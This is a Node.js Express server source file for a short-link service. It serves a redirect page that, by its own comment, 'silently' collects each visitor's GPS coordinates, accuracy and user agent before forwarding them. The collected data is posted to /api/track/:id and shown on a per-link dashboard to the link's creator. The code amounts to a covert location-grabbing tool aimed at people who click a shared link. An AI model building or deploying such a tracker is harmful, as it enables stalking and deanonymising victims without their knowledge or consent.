const express = require('express');
const path = require('path');
const app = express();
const port = 8000;

// Middleware
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// In-memory storage
const links = new Map();

// Generate unique ID
function generateId(length = 6) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Ensure URL has protocol
function ensureHttpProtocol(url) {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        return 'https://' + url;
    }
    return url;
}

// Generate new tracking link
app.post('/api/generate', (req, res) => {
    let { url } = req.body;
    
    if (!url) {
        return res.status(400).json({ error: 'URL is required' });
    }

    // Ensure URL has protocol
    url = ensureHttpProtocol(url);

    const id = generateId();
    const linkData = {
        id,
        originalUrl: url,
        createdAt: new Date(),
        visits: [],
        lastVisited: null
    };
    
    links.set(id, linkData);
    
    res.json({
        id,
        shortLink: `/t/${id}`,
        dashboardUrl: `/dashboard/${id}`,
        originalUrl: url,
        created: linkData.createdAt
    });
});

// Get all links
app.get('/api/links', (req, res) => {
    const linksArray = Array.from(links.values());
    res.json(linksArray);
});

// Get specific link data
app.get('/api/links/:id', (req, res) => {
    const { id } = req.params;
    const linkData = links.get(id);
    
    if (!linkData) {
        return res.status(404).json({ error: 'Link not found' });
    }
    
    res.json(linkData);
});

// Record visit with GPS data
app.post('/api/track/:id', (req, res) => {
    const { id } = req.params;
    const { latitude, longitude, accuracy, userAgent } = req.body;
    
    console.log('Received tracking data:', { id, latitude, longitude, accuracy, userAgent });
    
    const linkData = links.get(id);
    if (!linkData) {
        console.log('Link not found:', id);
        return res.status(404).json({ error: 'Link not found' });
    }
    
    const visitData = {
        timestamp: new Date(),
        latitude,
        longitude,
        accuracy,
        userAgent
    };
    
    linkData.visits.push(visitData);
    linkData.lastVisited = visitData.timestamp;
    
    console.log('Visit recorded for link:', id);
    res.json({ 
        success: true,
        redirectUrl: linkData.originalUrl 
    });
});

// Get redirect URL without tracking
app.get('/api/redirect/:id', (req, res) => {
    const { id } = req.params;
    const linkData = links.get(id);
    
    if (!linkData) {
        return res.status(404).json({ error: 'Link not found' });
    }
    
    res.json({ redirectUrl: linkData.originalUrl });
});

// Handle tracking link redirects
app.get('/t/:id', (req, res) => {
    const { id } = req.params;
    const linkData = links.get(id);
    
    if (!linkData) {
        return res.status(404).send('Link not found');
    }
    
    // Send tracking page that will silently collect data and redirect
    res.sendFile(path.join(__dirname, 'public', 'redirect.html'));
});

// Serve dashboard.html for individual dashboards
app.get('/dashboard/:id', (req, res) => {
    const { id } = req.params;
    if (!links.has(id)) {
        return res.status(404).send('Link not found');
    }
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Handle root path
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
